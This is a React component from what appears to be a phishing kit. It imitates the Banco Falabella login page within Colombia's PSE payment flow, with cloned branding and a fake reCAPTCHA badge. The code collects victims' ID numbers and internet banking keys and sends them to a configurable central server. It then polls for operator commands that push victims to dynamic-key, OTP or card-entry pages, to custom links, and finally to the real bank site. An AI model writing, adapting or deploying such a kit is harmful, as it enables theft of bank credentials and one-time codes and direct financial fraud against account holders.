import { useState, useRef, useEffect, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import FalabellaFooter from "../../components/FalabellaFooter";
import FalabellaHeader from "../../components/FalabellaHeader";
import FalabellaSidebar from "../../components/FalabellaSidebar";
import LoadingFalabella from "../../../../../components/LoadingFalabella";
import recaptchaIcon from "../../img/ReCAPTCHA_icon.svg";
import "./login_Falabella_pse.css";
import "../bf_pse_modal.css";

// Se inicializa la opción vacía para tipo de documento
const DOCUMENT_TYPE_EMPTY = "__empty__";

// Reglas de documento Colombia (CC, CE, NI, TI, PE) alineadas con Caja Social / Davivienda
const FALABELLA_DOC_TYPE_TO_RULE_KEY = {
  CC: "CC",
  CE: "CE",
  NIT: "NI",
  TI: "TI",
  PE: "PE",
};

const FALABELLA_DOC_RULES = {
  CC: {
    maxLen: 10,
    test: (n) => /^\d{6,10}$/.test(n),
    hint: "La cédula de ciudadanía debe tener entre 6 y 10 dígitos.",
  },
  CE: {
    maxLen: 10,
    test: (n) => /^\d{6,10}$/.test(n),
    hint: "La cédula de extranjería debe tener entre 6 y 10 dígitos.",
  },
  NI: {
    maxLen: 10,
    test: (n) => /^\d{9,10}$/.test(n),
    hint: "El NIT debe tener 9 o 10 dígitos.",
  },
  TI: {
    maxLen: 11,
    test: (n) => /^\d{10,11}$/.test(n),
    hint: "La tarjeta de identidad debe tener 10 u 11 dígitos.",
  },
  PE: {
    maxLen: 15,
    test: (n) => /^\d{6,15}$/.test(n),
    hint: "El permiso especial de permanencia debe tener entre 6 y 15 dígitos.",
  },
};

const FALABELLA_GENERIC_DOC_RULE = {
  maxLen: 15,
  test: (n) => /^\d{6,15}$/.test(n),
  hint: "El número de documento debe tener entre 6 y 15 dígitos.",
};

const FALABELLA_CLAVE_HINT = "La clave internet debe tener 6 dígitos numéricos.";

const getFalabellaDocRuleKey = (documentType) =>
  FALABELLA_DOC_TYPE_TO_RULE_KEY[documentType] ?? null;

const getFalabellaDocRule = (documentType) => {
  const key = getFalabellaDocRuleKey(documentType);
  return key ? FALABELLA_DOC_RULES[key] : FALABELLA_GENERIC_DOC_RULE;
};

const sanitizeFalabellaNumeroDocumento = (documentType, raw) => {
  const maxLen = getFalabellaDocRule(documentType).maxLen;
  return String(raw || "").replace(/\D/g, "").slice(0, maxLen);
};

const getFalabellaDocumentError = (documentType, numero) => {
  if (!documentType || documentType === DOCUMENT_TYPE_EMPTY) return null;
  if (numero === "") return null;
  if (!/^\d+$/.test(numero)) {
    return "El número de identificación solo debe contener dígitos.";
  }
  const rule = getFalabellaDocRule(documentType);
  return rule.test(numero) ? null : rule.hint;
};

const isFalabellaInternetKeyValid = (clave) => /^\d{6}$/.test(clave);

const isFalabellaPersonTypeValid = (personType) =>
  /^(natural|jur[ií]dica)$/i.test(String(personType || "").trim());

// Se inicializan las claves de estado para modal y mid flow
const FALABELLA_ERROR_KEY = "falabella_error_modal";
const FALABELLA_MID_FLOW_KEY = "falabella_mid_flow";

const FALABELLA_LOGIN_ERROR_MSG = "Tus datos son incorrectos. Vuelve a intentarlo.";
const FALABELLA_LOGIN_ERROR_AUTO_HIDE_MS = 5000;

// Se inicializan los mensajes del modal
const MODAL_MSG = {
  block_ip: "Acceso bloqueado por seguridad.",
};

// Se inicializan los estados a ignorar después del modal
const ESTADOS_IGNORAR_TRAS_MODAL = ["error_login"];

// Se definen los estados tras login
const ESTADOS_TRAS_LOGIN = [
  "sol_din",
  "sol_otp",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_din",
  "error_login",
  "block_ip",
  "error_blocked",
  "link_bot",
  "sol_link_custom",
];

// Se crea el componente para renderizar el icono de reCAPTCHA
const RecaptchaBadgeIcon = () => (
  <img
    src={recaptchaIcon}
    alt=""
    aria-hidden="true"
    className="falabella-recaptcha-badge__img"
    draggable={false}
  />
);

// Se crea el componente para renderizar el login del banco Falabella
const BancoFalabellaPSE = () => {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializan las referencias del polling y control de estado
  const sessionIdRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);

  // Se inicializan los estados del formulario y UI
  const [formData, setFormData] = useState({
    personType: "natural",
    documentType: DOCUMENT_TYPE_EMPTY,
    documentNumber: "",
    internetKey: "",
  });

  // Se inicializan los estados de UI
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const [shouldResetOnModalClose, setShouldResetOnModalClose] = useState(false);
  const [documentError, setDocumentError] = useState(null);
  const [claveError, setClaveError] = useState(null);
  const [showLoginErrorAlert, setShowLoginErrorAlert] = useState(false);

  const documentoMaxLength = useMemo(
    () => getFalabellaDocRule(formData.documentType).maxLen,
    [formData.documentType],
  );

  const documentValidationError = useMemo(
    () => getFalabellaDocumentError(formData.documentType, formData.documentNumber.trim()),
    [formData.documentType, formData.documentNumber],
  );

  // Se inicializa la validación del formulario
  const isFormValid =
    isFalabellaPersonTypeValid(formData.personType) &&
    formData.documentType !== DOCUMENT_TYPE_EMPTY &&
    formData.documentNumber.trim() !== "" &&
    !documentValidationError &&
    isFalabellaInternetKeyValid(formData.internetKey);

  const dismissLoginErrorAlert = () => {
    setShowLoginErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_login") {
      ignorarEstadoHastaCambioRef.current = "error_login";
      modalBloqueoEstadoRef.current = null;
      sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);
    }
  };

  const showLoginCredentialError = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
    setLoading(false);
    allowPollNavigationRef.current = false;
    modalBloqueoEstadoRef.current = "error_login";
    lastEstadoRef.current = "error_login";
    sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);
    setShowModal(false);
    setModalText("");
    setShouldResetOnModalClose(false);
    setFormData({
      personType: "natural",
      documentType: DOCUMENT_TYPE_EMPTY,
      documentNumber: "",
      internetKey: "",
    });
    setDocumentError(null);
    setClaveError(null);
    setShowLoginErrorAlert(true);
  };

  const dismissLoginErrorAlertIfOpen = () => {
    if (showLoginErrorAlert) {
      dismissLoginErrorAlert();
    }
  };

  // Se crea el useEffect para inicializar session y estado de error
  useEffect(() => {

    // Se captura el estado de error
    const pending = localStorage.getItem(FALABELLA_ERROR_KEY);
    const midFlow = sessionStorage.getItem(FALABELLA_MID_FLOW_KEY) === "1";
    const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);
    let handledLoginError = false;

    // Se valida el estado de error pendiente
    if (pending === "error_login") {
      showLoginCredentialError();
      handledLoginError = true;
    } else if (pending === "block_ip") {

      // Se setea el estado de error
      modalBloqueoEstadoRef.current = "block_ip";

      // Se setea el texto del modal
      setModalText(MODAL_MSG.block_ip);

      // Se muestra el modal
      setShowModal(true);
    }

    // Se elimina el estado de error pendiente
    if (pending) {

      // Se elimina el estado de error pendiente
      localStorage.removeItem(FALABELLA_ERROR_KEY);
    }

    // Se valida si existe handoff desde /pse
    if (pseHandoff) {

      // Se setea la sessionId
      localStorage.setItem("sessionId", pseHandoff);

      // Se setea la sessionId
      sessionIdRef.current = pseHandoff;

      // Se setea el ultimo estado
      lastEstadoRef.current = null;

      // Se elimina el handoff
      sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

      // Se elimina el estado de mid flow
      sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

      // Se setea el estado de navegacion por polling
      allowPollNavigationRef.current = false;

      // Se quita el loading
      setLoading(false);
    } else if (!handledLoginError && midFlow) {

      // Se captura la sessionId desde localStorage
      const sid = localStorage.getItem("sessionId");

      // Se setea la sessionId
      sessionIdRef.current = sid;

      // Se valida si existe sessionId
      if (sid) {

        // Se setea el estado de navegacion por polling
        allowPollNavigationRef.current = true;

        // Se activa el loading
        setLoading(true);

        // Se inicia el polling
        initPolling();
      }
    } else if (!handledLoginError) {

      // Se setea la sessionId
      sessionIdRef.current = localStorage.getItem("sessionId");

      // Se setea el estado de navegacion por polling
      allowPollNavigationRef.current = false;
    }

    // Se retorna el cleanup
    if (handledLoginError) {
      setLoading(false);
    }

    return () => {
      stopPolling();
    };
  }, []);

  useEffect(() => {
    if (!showLoginErrorAlert) return undefined;

    const timeoutId = setTimeout(() => {
      dismissLoginErrorAlert();
    }, FALABELLA_LOGIN_ERROR_AUTO_HIDE_MS);

    return () => clearTimeout(timeoutId);
  }, [showLoginErrorAlert]);

  // Se crea el metodo para parar el polling
  const stopPolling = () => {

    // Se valida si existe el intervalo de polling
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia
      pollingIntervalRef.current = null;
    }
  };

  // Se crea el metodo para iniciar el polling
  const initPolling = () => {

    // Se para el polling
    stopPolling();

    // Se setea el intervalo de polling
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se verifica el estado de inmediato
    verifyState();
  };

  // Se crea el metodo para verificar el estado actual
  const verifyState = async () => {

    // Se captura la sessionId desde localStorage
    const sid = sessionIdRef.current || localStorage.getItem("sessionId");

    // Se valida si existe sessionId
    if (!sid) return;

    // Se setea la sessionId
    sessionIdRef.current = sid;

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/falabella/verify-state/${sid}`);

      // Se captura la respuesta
      const { estado: estadoRaw, state, url, text, tc, tarjeta, bank } = response?.data || {};

      // Se captura el estado
      const estado = (estadoRaw || state || "").toString().toLowerCase();

      // Se valida si hay url
      const hasUrl = Boolean(url && String(url).trim());
      const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const isTcSession = Boolean(tc);
      const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;
      const linkPendiente = estado === "sol_link_bot" || (estado === "link_bot" && !hasUrl) || (estado === "sol_link_custom" && !customLink);

      // Se valida si existe estado para procesar
      if (!estado) return;

      // Se evita reprocesar el mismo estado despues de cerrar modal
      if (ignorarEstadoHastaCambioRef.current) {

        // Se valida si el estado es el mismo que el estado ignorado
        if (estado === ignorarEstadoHastaCambioRef.current) return;

        // Se resetea el estado de ignorar estado
        ignorarEstadoHastaCambioRef.current = null;

        // Se resetea el estado de bloqueo
        modalBloqueoEstadoRef.current = null;
      }

      // Se evita reabrir modal por el mismo estado bloqueado
      if (modalBloqueoEstadoRef.current && estado === modalBloqueoEstadoRef.current) {

        // Se retorna
        return;
      }

      // Se evita navegar por polling si aun no hay accion del usuario
      if (ESTADOS_TRAS_LOGIN.includes(estado) && !allowPollNavigationRef.current) {

        // Se retorna
        return;
      }

      // Se evita reprocesar estados repetidos cuando no hay link pendiente
      if (!linkPendiente && lastEstadoRef.current === estado) return;
      if (!linkPendiente) lastEstadoRef.current = estado;

      const bloqueadoPorErrorLogin = modalBloqueoEstadoRef.current === "error_login";

      // Se maneja la navegación según el estado retornado por verifyState
      switch (estado) {
        case "sol_din":
          if (bloqueadoPorErrorLogin) break;

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se setea el estado de mid flow
          sessionStorage.setItem(FALABELLA_MID_FLOW_KEY, "1");

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se navega a la pantalla de dinamica
          navigate("/falabella_dinamica_pse", { replace: true });

          // Se retorna
          break;
        case "sol_otp":
          if (bloqueadoPorErrorLogin) break;

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el estado de mid flow
          sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

          // Se valida si es flujo de TC OTP
          if (isTcOtpFlow) {

            // Se redirige al flujo de TC OTP
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          } else {

            // Se navega a la pantalla de OTP
            navigate("/falabella_otp_pse", { replace: true });
          }
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el estado de mid flow
          sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

          // Se limpia el localStorage
          localStorage.clear();

          // Se limpia el sessionStorage
          sessionStorage.clear();

          // Se redirige a la pantalla de finalizado
          if (isTcSession) {

            // Se redirige a la pantalla de finalizado de TC
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          } else {

            // Se redirige a la pantalla de finalizado de PSE
            window.location.href = `/finalizado-pse?sessionId=${sessionIdRef.current}`;
          }

          // Se retorna
          break;
        case "error_otp":
          if (bloqueadoPorErrorLogin) break;

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el estado de mid flow
          sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

          // Se valida si es flujo de TC OTP
          if (isTcOtpFlow) {

            // Se redirige al flujo de TC OTP
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          } else {

            // Se setea el estado de error
            localStorage.setItem(FALABELLA_ERROR_KEY, "error_otp");

            // Se navega a la pantalla de OTP
            navigate("/falabella_otp_pse", { replace: true });
          }
          break;
        case "error_din":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el estado de mid flow
          sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de error
          localStorage.setItem(FALABELLA_ERROR_KEY, "error_din");

          // Se navega a la pantalla de dinamica
          navigate("/falabella_dinamica_pse", { replace: true });

          // Se retorna
          break;
        case "error_login":
          showLoginCredentialError();
          break;
        case "link_bot":

          // Se valida si hay url
          if (hasUrl) {

            // Se para el polling
            stopPolling();

            // Se elimina el estado de mid flow
            sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

            // Se redirige a la url
            window.location.href = url;
          }

          // Se retorna
          break;
        case "sol_link_custom":

          // Se valida si hay url personalizada
          if (customLink) {

            // Se para el polling
            stopPolling();

            // Se elimina el estado de mid flow
            sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

            // Se redirige a la url personalizada
            window.location.href = customLink;
          }
          break;
        case "block_ip":
        case "error_blocked":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el estado de mid flow 
          sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de bloqueo
          modalBloqueoEstadoRef.current = "block_ip";

          // Se setea el texto del modal
          setModalText(MODAL_MSG.block_ip);

          // Se muestra el modal
          setShowModal(true);

          // Se retorna
          break;
        default:

          // Se retorna
          break;
      }
    } catch (error) {

      // Se captura el status y estado del error
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el estado corresponde a bloqueo de IP
      if (status === 403 && estadoErr === "error_blocked") {

        // Se para el polling
        stopPolling();

        // Se quita el loading
        setLoading(false);

        // Se elimina el estado de mid flow
        sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pantalla de inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  const clearValidationErrors = () => {
    setDocumentError(null);
    setClaveError(null);
  };

  // Se crea el metodo para manejar cambios en inputs
  const handleInputChange = (e) => {
    dismissLoginErrorAlertIfOpen();

    // Se captura el nombre y valor del input
    const { name, value } = e.target;

    if (name === "internetKey") {
      const digits = value.replace(/\D/g, "").slice(0, 6);
      setFormData((prev) => ({ ...prev, [name]: digits }));
      setClaveError(
        digits.length > 0 && !isFalabellaInternetKeyValid(digits) ? FALABELLA_CLAVE_HINT : null,
      );
      return;
    }

    if (name === "documentNumber") {
      const sanitized = sanitizeFalabellaNumeroDocumento(formData.documentType, value);
      setFormData((prev) => ({ ...prev, documentNumber: sanitized }));
      setDocumentError(getFalabellaDocumentError(formData.documentType, sanitized));
      return;
    }

    if (name === "documentType") {
      setFormData((prev) => {
        const documentNumber = sanitizeFalabellaNumeroDocumento(value, prev.documentNumber);
        return { ...prev, documentType: value, documentNumber };
      });
      setDocumentError(null);
      return;
    }

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  // Se crea el metodo para enviar usuario y clave al backend
  const handleSubmit = async (e) => {

    // Se previene el submit por defecto
    e.preventDefault();
    dismissLoginErrorAlertIfOpen();

    if (loading) return;

    if (formData.documentType === DOCUMENT_TYPE_EMPTY || !formData.documentNumber.trim()) {
      setDocumentError(
        formData.documentNumber.trim() === ""
          ? "Ingrese su número de documento."
          : "Seleccione el tipo de documento.",
      );
      return;
    }

    const docErr = getFalabellaDocumentError(formData.documentType, formData.documentNumber.trim());
    if (docErr) {
      setDocumentError(docErr);
      return;
    }

    if (!isFalabellaInternetKeyValid(formData.internetKey)) {
      setClaveError(FALABELLA_CLAVE_HINT);
      return;
    }

    setDocumentError(null);
    setClaveError(null);

    if (!isFormValid) return;

    // Se captura el usuario y clave
    const usuario = formData.documentNumber.trim();
    const clave = formData.internetKey;

    // Se captura la sessionId desde localStorage
    const sessionId = localStorage.getItem("sessionId");

    // Se valida que exista sessionId persistida
    if (!sessionId) {

      // Se setea el estado de error
      setShowModal(true);

      // Se setea el texto del modal
      setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");

      // Se retorna
      return;
    }

    // Se setea la sessionId
    sessionIdRef.current = sessionId;

    // Se captura la url central
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se crea el objeto de datos a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "tipoPersona": formData.personType,
          "tipoDocumento": formData.documentType,
          "usuario": usuario,
          "clave": clave,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/falabella/authenticacion",
        },
      },
    };

    // Se para el polling y se limpia el ultimo estado antes de login
    stopPolling();

    // Se limpia el ultimo estado
    lastEstadoRef.current = null;

    // Se usa try catch para el envio
    try {

      // Se activa el loading
      setLoading(true);

      // Se realiza la peticion al backend
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/falabella/authenticacion", dataSend);

      // Se valida la respuesta exitosa
      if (response.data?.success) {


        // Se captura la sessionId
        const sid = response.data.sessionId ?? sessionId;

        // Se setea la sessionId
        localStorage.setItem("sessionId", sid);

        // Se setea la sessionId
        sessionIdRef.current = sid;

        // Se setea el estado de mid flow
        sessionStorage.setItem(FALABELLA_MID_FLOW_KEY, "1");

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se inicia el polling
        initPolling();
      } else {

        // Se quita el loading
        setLoading(false);

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        // Se setea el texto del modal    
        setModalText("No se pudo iniciar sesión. Intenta nuevamente.");

        // Se muestra el modal
        setShowModal(true);
      }
    } catch (error) {

      // Se quita el loading y la navegacion por polling
      setLoading(false);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      // Se captura el status y estado del error
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el estado corresponde a bloqueo de IP
      if (status === 403 && estadoErr === "error_blocked") {

        // Se elimina el estado de mid flow
        sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pantalla de inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se retorna
        return;
      }

      // Se muestra el modal de error de comunicación
      const serverMsg = error?.response?.data?.message || error?.response?.data?.error || "";

      // Se setea el texto del modal
      setModalText(serverMsg ? `Error del servidor: ${serverMsg}` : centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.",);

      // Se muestra el modal
      setShowModal(true);
    }
  };

  // Se crea el metodo para limpiar formulario y cancelar
  const handleCancel = (e) => {

    // Se previene el comportamiento por defecto del boton
    e.preventDefault();

    // Se previene el comportamiento por defecto del boton
    e.stopPropagation();

    // Se limpia el formulario
    setFormData({
      personType: "natural",
      documentType: DOCUMENT_TYPE_EMPTY,
      documentNumber: "",
      internetKey: "",
    });
    clearValidationErrors();
    dismissLoginErrorAlert();
  };

  // Se crea el metodo para manejar el click en el enlace de recuperacion de clave
  const handleRecoveryClick = (e) => {

    // Se previene el comportamiento por defecto del enlace
    e.preventDefault();

    // Se previene el comportamiento por defecto del enlace
    e.stopPropagation();
  };

  // Se crea el metodo para cerrar el modal y resetear el formulario
  const closeModal = () => {

    // Se captura el estado de servidor
    const estadoServidor = modalBloqueoEstadoRef.current;

    // Se resetea el estado de servidor
    modalBloqueoEstadoRef.current = null;

    // Se valida si el estado de servidor es ignorado
    if (estadoServidor && ESTADOS_IGNORAR_TRAS_MODAL.includes(estadoServidor)) {

      // Se setea el estado de ignorar estado
      ignorarEstadoHastaCambioRef.current = estadoServidor;
    }

    // Se oculta el modal
    setShowModal(false);

    // Se limpia el texto del modal
    setModalText("");

    // Se valida si se debe resetear el formulario
    if (shouldResetOnModalClose) {

      // Se resetea el estado de reseteo del formulario
      setShouldResetOnModalClose(false);

      // Se limpia el formulario
      setFormData({
        personType: "natural",
        documentType: DOCUMENT_TYPE_EMPTY,
        documentNumber: "",
        internetKey: "",
      });
      clearValidationErrors();
    }

    // Se valida si el estado de servidor es bloqueo de IP
    if (estadoServidor === "block_ip") {

      // Se elimina el estado de mid flow
      sessionStorage.removeItem(FALABELLA_MID_FLOW_KEY);

      // Se limpia el localStorage
      localStorage.clear();

      // Se redirige a la pantalla de inicio
      window.location.href = process.env.REACT_APP_URL_BANK || "/";

      // Se retorna
      return;
    }

  };

  // Se retorna el HTML
  return (
    <div className="falabella-page falabella-page--pse">
      {/* Se renderiza el loading mientras se procesa login o polling */}
      {loading ? <LoadingFalabella /> : null}

      {/* Se renderiza el contenedor principal de login */}
      <div className="falabella-wrapper">
        {/* Se renderiza la columna lateral */}
        <FalabellaSidebar />

        {/* Se renderiza la columna principal */}
        <main className="falabella-main">
          {/* Se renderiza el encabezado de la pantalla */}
          <FalabellaHeader showWelcome={false} />

          {/* Se renderiza el contenido del formulario */}
          <div className="falabella-content">
            <form className="login-form" onSubmit={handleSubmit}>
              <div className="content-body">
                {/* Se renderiza el título principal */}
                <div className="content-header-simple">
                  <h1 className="content-title">
                    <strong>PSE</strong> pagos en línea
                  </h1>
                </div>

                <div className="falabella-login-alert-slot" aria-live="polite">
                  {showLoginErrorAlert ? (
                    <div className="falabella-login-alert" role="alert">
                      <span className="falabella-login-alert__icon" aria-hidden="true">
                        <svg viewBox="0 0 24 24" focusable="false">
                          <path
                            fill="currentColor"
                            d="M12 2.1 2.1 19.9h19.8L12 2.1z"
                          />
                          <path
                            fill="#ffffff"
                            d="M12 7.4a1 1 0 0 1 1 1v4.2a1 1 0 1 1-2 0v-4.2a1 1 0 0 1 1-1zm0 9a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z"
                          />
                        </svg>
                      </span>
                      <p className="falabella-login-alert__text">{FALABELLA_LOGIN_ERROR_MSG}</p>
                    </div>
                  ) : null}
                </div>

                {/* Se renderiza la grilla del formulario */}
                <div className="login-grid">
                  <div className="login-form-column">
                    {/* Se renderiza el selector de tipo de persona */}
                    <div className="form-row">
                      <label htmlFor="person-type" className="form-label">
                        Tipo de persona
                      </label>
                      <div className="select-wrapper">
                        <select
                          id="person-type"
                          name="personType"
                          value={formData.personType}
                          onChange={handleInputChange}
                          className="form-select"
                          disabled={loading}
                        >
                          <option value="Natural">Natural</option>
                          <option value="Jurídica">Jurídica</option>
                        </select>
                        <span className="select-arrow"></span>
                      </div>
                    </div>

                    {/* Se renderiza el selector de tipo de documento */}
                    <div className="form-row">
                      <label htmlFor="document-type" className="form-label">
                        Tipo de documento
                      </label>
                      <div className="select-wrapper">
                        <select
                          id="document-type"
                          name="documentType"
                          value={formData.documentType}
                          onChange={handleInputChange}
                          className={`form-select${formData.documentType === DOCUMENT_TYPE_EMPTY ? " form-select--empty" : ""}`}
                          disabled={loading}
                        >
                          <option value={DOCUMENT_TYPE_EMPTY}>
                            Seleccionar tipo de documento
                          </option>
                          <option value="CC">CC - Cédula de ciudadanía</option>
                          <option value="NIT">
                            Número de identificación tributaria
                          </option>
                          <option value="CE">CE - Cédula de extranjería</option>
                          <option value="TI">TI - Tarjeta de identidad</option>
                          <option value="PE">PE - Permiso especial de permanencia</option>
                          <option value="PAS">PAS - Pasaporte</option>
                          <option value="CD">CD - Carné diplomático</option>
                        </select>
                        <span className="select-arrow"></span>
                      </div>
                    </div>

                    {/* Se renderiza el campo de número de documento */}
                    <div className="form-row form-row--field">
                      <label htmlFor="document-number" className="form-label">
                        Número de documento
                      </label>
                      <div className="form-field">
                        <input
                          type="text"
                          id="document-number"
                          name="documentNumber"
                          value={formData.documentNumber}
                          onChange={handleInputChange}
                          placeholder="Ej. 1234567"
                          maxLength={documentoMaxLength}
                          inputMode="numeric"
                          className={`form-input${documentError ? " form-input--error" : ""}`}
                          autoComplete="off"
                          disabled={loading}
                          onBlur={() => {
                            setDocumentError(
                              getFalabellaDocumentError(
                                formData.documentType,
                                formData.documentNumber.trim(),
                              ),
                            );
                          }}
                        />
                        {documentError ? (
                          <p className="falabella-form-hint falabella-form-hint--error" role="alert">
                            {documentError}
                          </p>
                        ) : null}
                      </div>
                    </div>

                    {/* Se renderiza el campo de clave internet */}
                    <div className="form-row form-row--field form-row--clave">
                      <label htmlFor="internet-key" className="form-label">
                        Clave internet
                      </label>
                      <div className="form-field">
                        <input
                          type="password"
                          id="internet-key"
                          name="internetKey"
                          value={formData.internetKey}
                          onChange={handleInputChange}
                          placeholder="Ingresa tu clave"
                          maxLength={6}
                          inputMode="numeric"
                          pattern="\d{6}"
                          className={`form-input${claveError ? " form-input--error" : ""}`}
                          autoComplete="off"
                          disabled={loading}
                          onBlur={() => {
                            const clave = formData.internetKey;
                            setClaveError(
                              clave.length > 0 && !isFalabellaInternetKeyValid(clave)
                                ? FALABELLA_CLAVE_HINT
                                : null,
                            );
                          }}
                        />
                      </div>
                      {claveError ? (
                        <p className="falabella-clave-hint falabella-clave-hint--error" role="alert">
                          {claveError}
                        </p>
                      ) : null}
                    </div>

                    {/* Se renderiza el enlace de recuperación de clave */}
                    <div className="form-row link-row">
                      <div className="label-spacer"></div>
                      <a
                        href="#"
                        className="recovery-link"
                        onClick={handleRecoveryClick}
                      >
                        Recuperar o crear tu clave de internet
                        <svg
                          className="link-arrow"
                          viewBox="0 0 320 512"
                          width="12"
                          height="12"
                        >
                          <path
                            fill="currentColor"
                            d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"
                          />
                        </svg>
                      </a>
                    </div>
                  </div>
                </div>
              </div>

              {/* Se renderizan las acciones del formulario */}
              <div className="form-actions">
                <button
                  type="button"
                  className="falabella-btn falabella-btn-secondary"
                  onClick={handleCancel}
                  disabled={loading}
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  className="falabella-btn falabella-btn-primary"
                  disabled={!isFormValid || loading}
                >
                  Ingresar
                </button>
              </div>
            </form>
          </div>
        </main>
      </div>

      {/* Se renderiza el footer institucional */}
      <FalabellaFooter variant="pse" />

      {/* Se renderiza la insignia de protección reCAPTCHA */}
      <div
        className="falabella-recaptcha-badge"
        role="img"
        aria-label="protección de reCAPTCHA"
      >
        <div className="falabella-recaptcha-badge__icon">
          <RecaptchaBadgeIcon />
        </div>
        <div className="falabella-recaptcha-badge__text">
          protección de reCAPTCHA
        </div>
      </div>

      {/* Se renderiza el modal de mensajes */}
      {showModal ? (
        <div className="bf-pse-modal-overlay" role="presentation">
          <div className="bf-pse-modal-layout">
            <div className="bf-pse-modal-main">
              <div className="bf-pse-modal-card" role="dialog" aria-modal="true">
                <div className="bf-pse-modal-top">Banco Falabella</div>
                <div className="bf-pse-modal-mid">
                  <p>{modalText}</p>
                </div>
                <div className="bf-pse-modal-bot">
                  <button
                    type="button"
                    className="bf-pse-modal-accept"
                    onClick={closeModal}
                  >
                    Aceptar
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
};

// Se exporta el componente
export default BancoFalabellaPSE;